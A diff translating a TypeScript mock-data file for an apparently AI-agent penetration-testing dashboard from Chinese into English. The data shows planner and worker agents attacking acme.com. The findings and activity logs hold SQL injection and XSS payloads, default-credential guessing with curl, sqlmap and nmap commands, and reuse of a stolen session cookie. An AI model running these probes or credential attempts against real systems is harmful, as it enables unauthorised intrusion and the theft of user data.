@@ -19,8 +19,8 @@ export const ACTIVE_TASK = "t-acme-web";
 export const tasks: Task[] = [
   {
     id: "t-acme-web",
-    description: "Acme 官网与后台外部渗透（acme.com）",
-    goal: "拿到 acme.com 后台管理权限，确认可读取用户敏感数据。",
+    description: "Acme corporate site and admin panel external pentest (acme.com)",
+    goal: "Obtain admin panel access on acme.com and confirm sensitive user data can be read.",
     status: "running",
     created_at: T("2026-07-24T09:12:00Z"),
     created_unix: 1785489120,
@@ -33,8 +33,8 @@ export const tasks: Task[] = [
   },
   {
     id: "t-acme-api",
-    description: "api.acme.com 越权与注入测试",
-    goal: "评估 api.acme.com 订单/用户接口的越权(IDOR)与注入风险。",
+    description: "api.acme.com unauthorized access and injection testing",
+    goal: "Assess unauthorized access (IDOR) and injection risk in api.acme.com order/user endpoints.",
     status: "running",
     created_at: T("2026-07-25T14:05:00Z"),
     created_unix: 1785592500,
@@ -47,8 +47,8 @@ export const tasks: Task[] = [
   },
   {
     id: "t-shop-pay",
-    description: "shop.acme.com 支付与订单链路",
-    goal: "评估支付与订单接口的越权、金额篡改与竞态风险。",
+    description: "shop.acme.com payment and order flow",
+    goal: "Assess unauthorized access, amount tampering and race-condition risk in payment and order endpoints.",
     status: "paused",
     created_at: T("2026-07-22T08:30:00Z"),
     created_unix: 1785313800,
@@ -61,8 +61,8 @@ export const tasks: Task[] = [
   },
   {
     id: "t-vpn-edge",
-    description: "对外暴露面侦察（VPN / 边界服务）",
-    goal: "识别 acme.com 对外暴露的可利用边界服务。",
+    description: "External attack-surface recon (VPN / edge services)",
+    goal: "Identify exploitable edge services exposed by acme.com.",
     status: "done",
     created_at: T("2026-07-18T08:00:00Z"),
     created_unix: 1784966400,
@@ -117,7 +117,7 @@ export const companies: Company[] = [
     id: 1, name: "Acme Corp", logo: "",
     asset_count: 18,
     scope: [
-      { id: 1, company_id: 1, kind: "domain", domain: "acme.com", raw: "acme.com", reason: "主域" },
+      { id: 1, company_id: 1, kind: "domain", domain: "acme.com", raw: "acme.com", reason: "primary domain" },
       { id: 2, company_id: 1, kind: "cidr", net: "203.0.113.0/24", raw: "203.0.113.0/24" },
       { id: 3, company_id: 1, kind: "ip", net: "198.51.100.20", raw: "198.51.100.20" },
     ],
@@ -125,7 +125,7 @@ export const companies: Company[] = [
 ];
 
 export const assets: Asset[] = [
-  { id: 1, type: "root_domain", company_id: 1, task_ids: [1], domain: "acme.com", root_domain: "acme.com", icp: "京ICP备2021xxxx号", record_type: "A", record_value: ["203.0.113.10"], last_seen: T("2026-07-26T02:00:00Z") },
+  { id: 1, type: "root_domain", company_id: 1, task_ids: [1], domain: "acme.com", root_domain: "acme.com", icp: "Beijing ICP No. 2021xxxx", record_type: "A", record_value: ["203.0.113.10"], last_seen: T("2026-07-26T02:00:00Z") },
   { id: 2, type: "subdomain", company_id: 1, task_ids: [1], domain: "www.acme.com", root_domain: "acme.com", record_type: "CNAME", record_value: "acme.com", last_seen: T("2026-07-26T02:01:00Z") },
   { id: 3, type: "subdomain", company_id: 1, task_ids: [2], domain: "api.acme.com", root_domain: "acme.com", record_type: "A", record_value: ["203.0.113.11"], last_seen: T("2026-07-26T02:02:00Z") },
   { id: 4, type: "subdomain", company_id: 1, task_ids: [3], domain: "shop.acme.com", root_domain: "acme.com", record_type: "A", record_value: ["203.0.113.12"], last_seen: T("2026-07-26T02:03:00Z") },
@@ -136,8 +136,8 @@ export const assets: Asset[] = [
   { id: 9, type: "ip", company_id: 1, task_ids: [4], ip: "198.51.100.20", c_segment: "198.51.100.0", open_ports: [{ port: 443, service: "https" }, { port: 500, service: " isakmp" }], last_seen: T("2026-07-20T02:00:00Z") },
   { id: 10, type: "service", company_id: 1, task_ids: [1], ip: "203.0.113.10", port: 443, service_type: "https", service_name: "nginx/1.24.0", last_seen: T("2026-07-26T02:07:00Z") },
   { id: 11, type: "service", company_id: 1, task_ids: [4], ip: "198.51.100.20", port: 22, service_type: "ssh", service_name: "OpenSSH 8.9p1", last_seen: T("2026-07-20T02:00:00Z") },
-  { id: 12, type: "app", company_id: 1, task_ids: [1], url: "https://www.acme.com", app_name: "Acme 官网", category: "corp", status_code: 200, content_length: 48213, page_title: "Acme Corp — 企业官网", technologies: ["Nginx", "React", "Cloudflare"], favicon_mmh3: "-1580860059", last_seen: T("2026-07-26T02:08:00Z") },
-  { id: 13, type: "app", company_id: 1, task_ids: [1], url: "https://admin.acme.com", app_name: "后台管理", category: "admin", status_code: 200, content_length: 12044, page_title: "Acme Admin 登录", technologies: ["Nginx", "Vue", "Element-UI"], last_seen: T("2026-07-26T02:09:00Z") },
+  { id: 12, type: "app", company_id: 1, task_ids: [1], url: "https://www.acme.com", app_name: "Acme corporate site", category: "corp", status_code: 200, content_length: 48213, page_title: "Acme Corp — Corporate Site", technologies: ["Nginx", "React", "Cloudflare"], favicon_mmh3: "-1580860059", last_seen: T("2026-07-26T02:08:00Z") },
+  { id: 13, type: "app", company_id: 1, task_ids: [1], url: "https://admin.acme.com", app_name: "Admin panel", category: "admin", status_code: 200, content_length: 12044, page_title: "Acme Admin Login", technologies: ["Nginx", "Vue", "Element-UI"], last_seen: T("2026-07-26T02:09:00Z") },
   { id: 14, type: "app", company_id: 1, task_ids: [2], url: "https://api.acme.com", app_name: "REST API", category: "api", status_code: 401, content_length: 45, page_title: "", technologies: ["Kong", "Node.js"], last_seen: T("2026-07-26T02:10:00Z") },
   { id: 15, type: "endpoint", company_id: 1, task_ids: [2], url: "https://api.acme.com/v1/orders", method: "GET", status_code: 200, params: [{ name: "id", in: "query" }, { name: "page", in: "query" }], last_seen: T("2026-07-26T02:11:00Z") },
   { id: 16, type: "endpoint", company_id: 1, task_ids: [2], url: "https://api.acme.com/v1/users/me", method: "GET", status_code: 200, last_seen: T("2026-07-26T02:12:00Z") },
@@ -152,45 +152,45 @@ export const assetCounts: Record<string, number> = assets.reduce<Record<string, 
 
 // ── Findings ─────────────────────────────────────────────────────────────────
 export const findings: Finding[] = [
-  { id: "f-1", vulnclass: "SQL Injection", severity: "high", summary: "www.acme.com/search q 参数存在报错型 SQL 注入", evidence: "GET /search?q=1' AND 1=CONVERT(int,@@version)-- → 返回 MSSQL 版本报错，可读库结构。", intent_id: "i-2", task_id: "t-acme-web", task_description: "Acme 官网与后台外部渗透", ts: T("2026-07-26T01:20:00Z") },
-  { id: "f-2", vulnclass: "IDOR", severity: "high", summary: "api.acme.com/v1/orders?id= 可越权读取他人订单", evidence: "将 id=1001 改为 id=1002 返回他人订单（含收货地址、手机号），无归属校验。", intent_id: "i-5", task_id: "t-acme-api", task_description: "api.acme.com 越权与注入测试", ts: T("2026-07-26T02:44:00Z") },
-  { id: "f-3", vulnclass: "Weak JWT", severity: "high", summary: "API JWT 使用弱密钥、可离线爆破伪造", evidence: "HS256，密钥 'secret'，john 5 秒破解 → 可伪造任意 sub 越权。", task_id: "t-acme-api", task_description: "api.acme.com 越权与注入测试", ts: T("2026-07-26T03:02:00Z") },
-  { id: "f-4", vulnclass: "Reflected XSS", severity: "medium", summary: "搜索页对 q 参数未转义，反射型 XSS", evidence: "q=<script>alert(document.domain)</script> 原样回显于结果标题。", task_id: "t-acme-web", task_description: "Acme 官网与后台外部渗透", ts: T("2026-07-25T22:10:00Z") },
-  { id: "f-5", vulnclass: "Exposed .git", severity: "medium", summary: "www.acme.com 暴露 .git 目录，可还原源码", evidence: "GET /.git/HEAD → 200；git-dumper 还原出后端源码与数据库连接串注释。", task_id: "t-acme-web", task_description: "Acme 官网与后台外部渗透", ts: T("2026-07-25T20:30:00Z") },
-  { id: "f-6", vulnclass: "Default Credentials", severity: "high", summary: "admin.acme.com 后台默认口令 admin/admin123", evidence: "登录成功，进入管理后台，可管理用户与订单。", intent_id: "i-3", task_id: "t-acme-web", task_description: "Acme 官网与后台外部渗透", ts: T("2026-07-26T03:50:00Z") },
-  { id: "f-7", vulnclass: "Open Redirect", severity: "low", summary: "登录后 next 参数任意跳转", evidence: "/login?next=https://evil.example 登录后 302 跳到外站。", task_id: "t-acme-web", task_description: "Acme 官网与后台外部渗透", ts: T("2026-07-25T19:12:00Z") },
-  { id: "f-8", vulnclass: "Missing Rate Limit", severity: "medium", summary: "登录接口无速率限制，可暴力破解", evidence: "1000 次/分钟无锁定，无验证码。", task_id: "t-acme-web", task_description: "Acme 官网与后台外部渗透", ts: T("2026-07-25T18:40:00Z") },
-  { id: "f-9", vulnclass: "Verbose Error", severity: "low", summary: "API 500 返回堆栈，泄露路径与框架版本", evidence: "触发 500 返回 Node.js 堆栈，泄露绝对路径与依赖版本。", task_id: "t-acme-api", task_description: "api.acme.com 越权与注入测试", ts: T("2026-07-25T23:05:00Z") },
-  { id: "f-10", vulnclass: "Outdated Component", severity: "medium", summary: "shop 使用存在已知 RCE 的老版本组件", evidence: "指纹识别到组件 v2.3.1，对应 CVE-2024-xxxx 反序列化 RCE。", task_id: "t-shop-pay", task_description: "shop.acme.com 支付与订单链路", ts: T("2026-07-23T15:00:00Z") },
+  { id: "f-1", vulnclass: "SQL Injection", severity: "high", summary: "www.acme.com/search q parameter has error-based SQL injection", evidence: "GET /search?q=1' AND 1=CONVERT(int,@@version)-- → returns an MSSQL version error, database structure can be read.", intent_id: "i-2", task_id: "t-acme-web", task_description: "Acme corporate site and admin panel external pentest", ts: T("2026-07-26T01:20:00Z") },
+  { id: "f-2", vulnclass: "IDOR", severity: "high", summary: "api.acme.com/v1/orders?id= allows unauthorized reading of other users' orders", evidence: "Changing id=1001 to id=1002 returns another user's order (including shipping address and phone number), with no ownership check.", intent_id: "i-5", task_id: "t-acme-api", task_description: "api.acme.com unauthorized access and injection testing", ts: T("2026-07-26T02:44:00Z") },
+  { id: "f-3", vulnclass: "Weak JWT", severity: "high", summary: "API JWT uses a weak key, can be brute-forced offline and forged", evidence: "HS256, key 'secret', cracked by john in 5 seconds → arbitrary sub can be forged for unauthorized access.", task_id: "t-acme-api", task_description: "api.acme.com unauthorized access and injection testing", ts: T("2026-07-26T03:02:00Z") },
+  { id: "f-4", vulnclass: "Reflected XSS", severity: "medium", summary: "Search page does not escape the q parameter, reflected XSS", evidence: "q=<script>alert(document.domain)</script> is echoed verbatim in the result title.", task_id: "t-acme-web", task_description: "Acme corporate site and admin panel external pentest", ts: T("2026-07-25T22:10:00Z") },
+  { id: "f-5", vulnclass: "Exposed .git", severity: "medium", summary: "www.acme.com exposes the .git directory, source code can be reconstructed", evidence: "GET /.git/HEAD → 200; git-dumper reconstructed the backend source code and database connection-string comments.", task_id: "t-acme-web", task_description: "Acme corporate site and admin panel external pentest", ts: T("2026-07-25T20:30:00Z") },
+  { id: "f-6", vulnclass: "Default Credentials", severity: "high", summary: "admin.acme.com admin panel default credentials admin/admin123", evidence: "Login succeeded, entered the admin panel, can manage users and orders.", intent_id: "i-3", task_id: "t-acme-web", task_description: "Acme corporate site and admin panel external pentest", ts: T("2026-07-26T03:50:00Z") },
+  { id: "f-7", vulnclass: "Open Redirect", severity: "low", summary: "The next parameter allows arbitrary redirect after login", evidence: "/login?next=https://evil.example redirects 302 to an external site after login.", task_id: "t-acme-web", task_description: "Acme corporate site and admin panel external pentest", ts: T("2026-07-25T19:12:00Z") },
+  { id: "f-8", vulnclass: "Missing Rate Limit", severity: "medium", summary: "Login endpoint has no rate limit, can be brute-forced", evidence: "1000 requests/minute with no lockout, no CAPTCHA.", task_id: "t-acme-web", task_description: "Acme corporate site and admin panel external pentest", ts: T("2026-07-25T18:40:00Z") },
+  { id: "f-9", vulnclass: "Verbose Error", severity: "low", summary: "API 500 returns a stack trace, leaking paths and framework version", evidence: "Triggering a 500 returns a Node.js stack trace, leaking absolute paths and dependency versions.", task_id: "t-acme-api", task_description: "api.acme.com unauthorized access and injection testing", ts: T("2026-07-25T23:05:00Z") },
+  { id: "f-10", vulnclass: "Outdated Component", severity: "medium", summary: "shop uses an outdated component with a known RCE", evidence: "Fingerprinting identified component v2.3.1, matching CVE-2024-xxxx deserialization RCE.", task_id: "t-shop-pay", task_description: "shop.acme.com payment and order flow", ts: T("2026-07-23T15:00:00Z") },
 ];
 
 // ── Exploration graph (active task) ──────────────────────────────────────────
-// 现行模型：根是 fact/state=origin（渲染为「起点」）；payload 为 JSON 字符串，
-// goal 取 text、其余取 summary。结构：根→目标(spawns)→意图(spawns)→事实/漏洞(yields)，
-// 漏洞→目标(proves)，提示→意图(derived_from)。
+// Current model: the root is fact/state=origin (rendered as "origin"); payload is a JSON string,
+// goal uses text, everything else uses summary. Structure: root→goal(spawns)→intent(spawns)→fact/finding(yields),
+// finding→goal(proves), hint→intent(derived_from).
 const P = (o: Record<string, string>) => JSON.stringify(o);
 
 export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
   nodes: [
-    { id: "root", type: "fact", payload: P({ summary: "根：acme.com 外部渗透" }), priority: 0, state: "origin", origin: "system", ts: T("2026-07-24T09:12:00Z") },
-    // 目标（由 goals agent 拆解）
-    { id: "g1", type: "goal", payload: P({ text: "获取后台管理权限" }), priority: 9, state: "met", origin: "goals", ts: T("2026-07-24T09:13:00Z") },
-    { id: "g2", type: "goal", payload: P({ text: "读取用户敏感数据" }), priority: 8, state: "open", origin: "goals", ts: T("2026-07-24T09:13:00Z") },
-    // 意图（由 planner 从目标派生）
-    { id: "i1", type: "intent", payload: P({ summary: "acme.com 子域枚举与端口扫描" }), priority: 6, state: "done", origin: "planner", ts: T("2026-07-24T09:20:00Z") },
-    { id: "i2", type: "intent", payload: P({ summary: "admin 后台默认口令 / 弱口令测试" }), priority: 9, state: "done", origin: "planner", ts: T("2026-07-26T03:30:00Z") },
-    { id: "i3", type: "intent", payload: P({ summary: "枚举后台功能与用户数据接口" }), priority: 8, state: "running", origin: "planner", ts: T("2026-07-26T03:55:00Z") },
-    { id: "i4", type: "intent", payload: P({ summary: "www.acme.com/search 页 SQL 注入探测" }), priority: 8, state: "done", origin: "planner", ts: T("2026-07-25T22:00:00Z") },
-    { id: "i5", type: "intent", payload: P({ summary: "api.acme.com 订单接口越权(IDOR)测试" }), priority: 8, state: "running", origin: "planner", ts: T("2026-07-26T02:30:00Z") },
-    // 事实
-    { id: "fa1", type: "fact", payload: P({ summary: "发现子域 admin.acme.com（Element-UI 后台）" }), priority: 0, state: "open", origin: "work#1", ts: T("2026-07-24T09:40:00Z") },
-    { id: "fa2", type: "fact", payload: P({ summary: "search 页 q 参数为 error-based 注入点(MSSQL)" }), priority: 0, state: "open", origin: "work#4", ts: T("2026-07-25T22:05:00Z") },
-    // 漏洞
-    { id: "fi1", type: "finding", payload: P({ summary: "后台默认口令 admin/admin123" }), priority: 0, state: "confirmed", origin: "work#2", ts: T("2026-07-26T03:50:00Z") },
-    { id: "fi2", type: "finding", payload: P({ summary: "SQL 注入（search q）可读 acme_prod 库" }), priority: 0, state: "confirmed", origin: "work#4", ts: T("2026-07-26T01:20:00Z") },
-    { id: "fi3", type: "finding", payload: P({ summary: "IDOR：/v1/orders?id= 可越权读他人订单" }), priority: 0, state: "confirmed", origin: "work#5", ts: T("2026-07-26T02:44:00Z") },
-    // 提示（主 agent 注入）
-    { id: "h1", type: "hint", payload: P({ summary: "后台是 Element-UI，优先跑默认口令表" }), priority: 5, state: "consumed", origin: "mainagent", ts: T("2026-07-26T03:20:00Z") },
+    { id: "root", type: "fact", payload: P({ summary: "Root: acme.com external pentest" }), priority: 0, state: "origin", origin: "system", ts: T("2026-07-24T09:12:00Z") },
+    // Goals (decomposed by the goals agent)
+    { id: "g1", type: "goal", payload: P({ text: "Obtain admin panel access" }), priority: 9, state: "met", origin: "goals", ts: T("2026-07-24T09:13:00Z") },
+    { id: "g2", type: "goal", payload: P({ text: "Read sensitive user data" }), priority: 8, state: "open", origin: "goals", ts: T("2026-07-24T09:13:00Z") },
+    // Intents (derived from goals by the planner)
+    { id: "i1", type: "intent", payload: P({ summary: "acme.com subdomain enumeration and port scanning" }), priority: 6, state: "done", origin: "planner", ts: T("2026-07-24T09:20:00Z") },
+    { id: "i2", type: "intent", payload: P({ summary: "admin panel default credentials / weak credentials testing" }), priority: 9, state: "done", origin: "planner", ts: T("2026-07-26T03:30:00Z") },
+    { id: "i3", type: "intent", payload: P({ summary: "Enumerate admin panel features and user-data endpoints" }), priority: 8, state: "running", origin: "planner", ts: T("2026-07-26T03:55:00Z") },
+    { id: "i4", type: "intent", payload: P({ summary: "www.acme.com/search page SQL injection probing" }), priority: 8, state: "done", origin: "planner", ts: T("2026-07-25T22:00:00Z") },
+    { id: "i5", type: "intent", payload: P({ summary: "api.acme.com order endpoint unauthorized access (IDOR) testing" }), priority: 8, state: "running", origin: "planner", ts: T("2026-07-26T02:30:00Z") },
+    // Facts
+    { id: "fa1", type: "fact", payload: P({ summary: "Discovered subdomain admin.acme.com (Element-UI admin panel)" }), priority: 0, state: "open", origin: "work#1", ts: T("2026-07-24T09:40:00Z") },
+    { id: "fa2", type: "fact", payload: P({ summary: "search page q parameter is an error-based injection point (MSSQL)" }), priority: 0, state: "open", origin: "work#4", ts: T("2026-07-25T22:05:00Z") },
+    // Findings
+    { id: "fi1", type: "finding", payload: P({ summary: "Admin panel default credentials admin/admin123" }), priority: 0, state: "confirmed", origin: "work#2", ts: T("2026-07-26T03:50:00Z") },
+    { id: "fi2", type: "finding", payload: P({ summary: "SQL injection (search q) can read the acme_prod database" }), priority: 0, state: "confirmed", origin: "work#4", ts: T("2026-07-26T01:20:00Z") },
+    { id: "fi3", type: "finding", payload: P({ summary: "IDOR: /v1/orders?id= allows unauthorized reading of other users' orders" }), priority: 0, state: "confirmed", origin: "work#5", ts: T("2026-07-26T02:44:00Z") },
+    // Hints (injected by the main agent)
+    { id: "h1", type: "hint", payload: P({ summary: "Admin panel is Element-UI, prioritize running the default credentials list" }), priority: 5, state: "consumed", origin: "mainagent", ts: T("2026-07-26T03:20:00Z") },
   ],
   edges: [
     { src: "root", dst: "g1", rel: "spawns" },
@@ -213,71 +213,71 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
 export const intents: TaskNode[] = explorationGraph.nodes.filter((n) => n.type === "intent");
 export const frontier: TaskNode[] = explorationGraph.nodes.filter((n) => n.type === "intent" && (n.state === "open" || n.state === "running"));
 
-// ── Activity（执行过程）─────────────────────────────────────────────────────
-// 会话由 sessions-tab 从「意图」派生（session.id = intent.id），transcript = 匹配
-// intent_id 的活动流。planner=worker "planner"、主 agent=worker "mainagent"。
-// 每个 worker 会话含完整工具执行链（tool_use → tool_result → …→ result）。
+// ── Activity (execution trace) ─────────────────────────────────────────────────────
+// Sessions are derived by sessions-tab from "intents" (session.id = intent.id), transcript = activity
+// stream matching intent_id. planner=worker "planner", main agent=worker "mainagent".
+// Each worker session contains the full tool execution chain (tool_use → tool_result → …→ result).
 export const activity: Activity[] = [
   // planner
-  { seq: 1, worker: "planner", ts: T("2026-07-24T09:12:10Z"), kind: "round", summary: "第 0 轮 · 目标拆解" },
-  { seq: 2, worker: "planner", ts: T("2026-07-24T09:12:30Z"), kind: "thinking", summary: "acme.com 是企业站，攻击面：官网(www)、后台(admin)、API(api)、商城(shop)。先枚举资产，再挑高价值目标。" },
-  { seq: 3, worker: "planner", ts: T("2026-07-24T09:13:00Z"), kind: "text", summary: "拆出两个目标：① 获取后台管理权限 ② 读取用户敏感数据。派生首批意图：子域枚举、后台口令测试、注入探测、API 越权。" },
-  { seq: 4, worker: "planner", ts: T("2026-07-26T03:55:00Z"), kind: "round", summary: "第 3 轮 · 复盘" },
-  { seq: 5, worker: "planner", ts: T("2026-07-26T03:55:10Z"), kind: "text", summary: "后台已拿下(g1 达成)。继续 g2：派生「枚举后台用户接口」「API IDOR 测试」两条意图并提高优先级。" },
+  { seq: 1, worker: "planner", ts: T("2026-07-24T09:12:10Z"), kind: "round", summary: "Round 0 · goal decomposition" },
+  { seq: 2, worker: "planner", ts: T("2026-07-24T09:12:30Z"), kind: "thinking", summary: "acme.com is a corporate site; attack surface: corporate site (www), admin panel (admin), API (api), shop (shop). First enumerate assets, then pick high-value targets." },
+  { seq: 3, worker: "planner", ts: T("2026-07-24T09:13:00Z"), kind: "text", summary: "Split into two goals: ① obtain admin panel access ② read sensitive user data. Derived the first batch of intents: subdomain enumeration, admin panel credential testing, injection probing, API unauthorized access." },
+  { seq: 4, worker: "planner", ts: T("2026-07-26T03:55:00Z"), kind: "round", summary: "Round 3 · review" },
+  { seq: 5, worker: "planner", ts: T("2026-07-26T03:55:10Z"), kind: "text", summary: "Admin panel compromised (g1 met). Continue g2: derive two intents, \"enumerate admin panel user endpoints\" and \"API IDOR testing\", and raise their priority." },
 
-  // work#1 · i1 子域枚举与端口扫描（done）
-  { seq: 10, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:20:00Z"), kind: "thinking", summary: "先被动侦察子域，再对存活主机做端口/服务识别。" },
+  // work#1 · i1 subdomain enumeration and port scanning (done)
+  { seq: 10, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:20:00Z"), kind: "thinking", summary: "First passively recon subdomains, then do port/service identification on live hosts." },
   { seq: 11, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:20:30Z"), kind: "tool_use", tool: "bash", tool_use_id: "t11", summary: "subfinder -d acme.com -silent | httpx -silent -sc -title" },
-  { seq: 12, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:22:10Z"), kind: "tool_result", tool: "bash", tool_use_id: "t11", summary: "www.acme.com [200] Acme Corp\nadmin.acme.com [200] Acme Admin 登录\napi.acme.com [401]\nshop.acme.com [200]\nvpn.acme.com [200]", detail: "5 个存活子域，其中 admin 是后台登录页。" },
+  { seq: 12, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:22:10Z"), kind: "tool_result", tool: "bash", tool_use_id: "t11", summary: "www.acme.com [200] Acme Corp\nadmin.acme.com [200] Acme Admin Login\napi.acme.com [401]\nshop.acme.com [200]\nvpn.acme.com [200]", detail: "5 live subdomains; admin is the admin panel login page." },
   { seq: 13, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:23:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t12", summary: "nmap -sV -T4 -p- 203.0.113.10" },
-  { seq: 14, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:26:40Z"), kind: "tool_result", tool: "bash", tool_use_id: "t12", summary: "22/tcp ssh OpenSSH 8.9p1\n80/tcp http nginx 1.24.0\n443/tcp https nginx 1.24.0", detail: "开放 22/80/443。" },
-  { seq: 15, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:27:00Z"), kind: "tool_use", tool: "upsert_asset", tool_use_id: "t13", summary: "upsert_asset × 6（子域+服务）" },
+  { seq: 14, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:26:40Z"), kind: "tool_result", tool: "bash", tool_use_id: "t12", summary: "22/tcp ssh OpenSSH 8.9p1\n80/tcp http nginx 1.24.0\n443/tcp https nginx 1.24.0", detail: "22/80/443 open." },
+  { seq: 15, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:27:00Z"), kind: "tool_use", tool: "upsert_asset", tool_use_id: "t13", summary: "upsert_asset × 6 (subdomains + services)" },
   { seq: 16, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:27:01Z"), kind: "tool_result", tool: "upsert_asset", tool_use_id: "t13", summary: "6 assets upserted" },
-  { seq: 17, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:40:00Z"), kind: "result", summary: "资产侦察完成，发现后台 admin.acme.com，交回图。", input_tokens: 96000, output_tokens: 6100, cache_read_tokens: 61000, cache_write_tokens: 9000 },
+  { seq: 17, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:40:00Z"), kind: "result", summary: "Asset recon complete, discovered admin panel admin.acme.com, handed back to the graph.", input_tokens: 96000, output_tokens: 6100, cache_read_tokens: 61000, cache_write_tokens: 9000 },
 
-  // work#2 · i2 后台默认口令（done，证明 g1）
-  { seq: 20, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:31:00Z"), kind: "thinking", summary: "后台是 Element-UI，登录接口无验证码、无速率限制。先试默认口令表，再上字典。" },
+  // work#2 · i2 admin panel default credentials (done, proves g1)
+  { seq: 20, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:31:00Z"), kind: "thinking", summary: "Admin panel is Element-UI; login endpoint has no CAPTCHA and no rate limit. First try the default credentials list, then a dictionary." },
   { seq: 21, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:32:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t21", summary: "curl -s -d 'username=admin&password=admin' https://admin.acme.com/login -o /dev/null -w '%{http_code}'" },
-  { seq: 22, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:32:03Z"), kind: "tool_result", tool: "bash", tool_use_id: "t21", summary: "401", detail: "admin/admin 失败。" },
+  { seq: 22, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:32:03Z"), kind: "tool_result", tool: "bash", tool_use_id: "t21", summary: "401", detail: "admin/admin failed." },
   { seq: 23, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:32:30Z"), kind: "tool_use", tool: "bash", tool_use_id: "t22", summary: "curl -si -d 'username=admin&password=admin123' https://admin.acme.com/login" },
-  { seq: 24, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:32:33Z"), kind: "tool_result", tool: "bash", tool_use_id: "t22", summary: "HTTP/1.1 302 Found\nSet-Cookie: session=eyJ…; HttpOnly\nLocation: /dashboard", detail: "admin/admin123 登录成功，拿到会话 cookie。" },
+  { seq: 24, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:32:33Z"), kind: "tool_result", tool: "bash", tool_use_id: "t22", summary: "HTTP/1.1 302 Found\nSet-Cookie: session=eyJ…; HttpOnly\nLocation: /dashboard", detail: "admin/admin123 login succeeded, obtained session cookie." },
   { seq: 25, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:33:10Z"), kind: "tool_use", tool: "bash", tool_use_id: "t23", summary: "curl -s -b 'session=eyJ…' https://admin.acme.com/dashboard | grep -o '<title>[^<]*'" },
-  { seq: 26, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:33:12Z"), kind: "tool_result", tool: "bash", tool_use_id: "t23", summary: "<title>Acme Admin · 控制台", detail: "确认已进入后台控制台。" },
+  { seq: 26, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:33:12Z"), kind: "tool_result", tool: "bash", tool_use_id: "t23", summary: "<title>Acme Admin · Console", detail: "Confirmed entry into the admin console." },
   { seq: 27, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:34:00Z"), kind: "tool_use", tool: "report_finding", tool_use_id: "t24", summary: "report_finding(Default Credentials, high)" },
-  { seq: 28, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:34:01Z"), kind: "tool_result", tool: "report_finding", tool_use_id: "t24", summary: "finding f-6 已记录，并连到目标 g1（proves）" },
-  { seq: 29, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:50:00Z"), kind: "result", summary: "后台默认口令确认，目标①达成。", input_tokens: 72000, output_tokens: 4800, cache_read_tokens: 48000, cache_write_tokens: 7200 },
+  { seq: 28, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:34:01Z"), kind: "tool_result", tool: "report_finding", tool_use_id: "t24", summary: "finding f-6 recorded and linked to goal g1 (proves)" },
+  { seq: 29, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:50:00Z"), kind: "result", summary: "Admin panel default credentials confirmed, goal ① met.", input_tokens: 72000, output_tokens: 4800, cache_read_tokens: 48000, cache_write_tokens: 7200 },
 
-  // work#4 · i4 SQL 注入（done）
-  { seq: 40, worker: "work#4", intent_id: "i4", ts: T("2026-07-25T22:01:00Z"), kind: "thinking", summary: "search?q= 结果页把 q 拼进标题，先手工加单引号看报错。" },
+  // work#4 · i4 SQL injection (done)
+  { seq: 40, worker: "work#4", intent_id: "i4", ts: T("2026-07-25T22:01:00Z"), kind: "thinking", summary: "The search?q= results page concatenates q into the title; first manually add a single quote to check for errors." },
   { seq: 41, worker: "work#4", intent_id: "i4", ts: T("2026-07-25T22:02:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t41", summary: "curl -s \"https://www.acme.com/search?q=1'\" | grep -i 'sql\\|syntax'" },
-  { seq: 42, worker: "work#4", intent_id: "i4", ts: T("2026-07-25T22:02:04Z"), kind: "tool_result", tool: "bash", tool_use_id: "t41", summary: "Unclosed quotation mark ... near '1'.", detail: "MSSQL 报错型注入迹象。" },
+  { seq: 42, worker: "work#4", intent_id: "i4", ts: T("2026-07-25T22:02:04Z"), kind: "tool_result", tool: "bash", tool_use_id: "t41", summary: "Unclosed quotation mark ... near '1'.", detail: "Signs of MSSQL error-based injection." },
   { seq: 43, worker: "work#4", intent_id: "i4", ts: T("2026-07-25T22:03:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t42", summary: "sqlmap -u 'https://www.acme.com/search?q=1' --batch --dbs --level 2" },
-  { seq: 44, worker: "work#4", intent_id: "i4", ts: T("2026-07-26T01:18:00Z"), kind: "tool_result", tool: "bash", tool_use_id: "t42", summary: "Parameter: q (GET) — error-based, MSSQL\navailable databases [4]: acme_prod, information_schema, master, tempdb", detail: "确认可注入，枚举出 4 个库。" },
+  { seq: 44, worker: "work#4", intent_id: "i4", ts: T("2026-07-26T01:18:00Z"), kind: "tool_result", tool: "bash", tool_use_id: "t42", summary: "Parameter: q (GET) — error-based, MSSQL\navailable databases [4]: acme_prod, information_schema, master, tempdb", detail: "Injection confirmed, enumerated 4 databases." },
